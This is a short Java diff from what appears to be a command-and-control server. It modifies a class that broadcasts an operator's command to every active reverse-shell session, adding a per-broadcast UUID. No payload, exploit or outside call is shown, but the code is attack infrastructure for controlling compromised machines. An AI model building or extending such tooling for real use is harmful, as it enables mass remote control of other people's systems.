@@ -1,6 +1,6 @@
 package com.mtattab.c2cServer.service.commands.manager;
 
-import com.mtattab.c2cServer.model.json.ManagerCommunicationModel;
+import com.mtattab.c2cServer.model.json.shell.ManagerCommunicationModel;
 import com.mtattab.c2cServer.service.Command;
 import com.mtattab.c2cServer.service.commands.connected.DefualtConnectedCommand;
 import com.mtattab.c2cServer.util.ConnectionManager;
@@ -11,6 +11,7 @@ import org.springframework.web.socket.WebSocketSession;
 
 import java.util.ArrayList;
 import java.util.List;
+import java.util.UUID;
 
 public class AllSendCommand implements Command {
     @Override
@@ -38,9 +39,9 @@ public class AllSendCommand implements Command {
     private void sendMessageToALlAgents(List<String> args,  WebSocketSession currentSocket ){
         String mangerMessage = DataManipulationUtil.joinListWithDelimiter(args," ");
         DefualtConnectedCommand defualtConnectedCommand = new DefualtConnectedCommand();
-
+        String uuid = UUID.randomUUID().toString();
         for (WebSocketSession activeReverseShellSession : ConnectionManager.activeReverseShellSessions) {
-            defualtConnectedCommand.sendCommandToShell( mangerMessage , activeReverseShellSession, currentSocket);
+            defualtConnectedCommand.sendCommandToShell( mangerMessage , activeReverseShellSession, currentSocket, uuid);
         }
 
         SocketUtil.sendMessage(currentSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
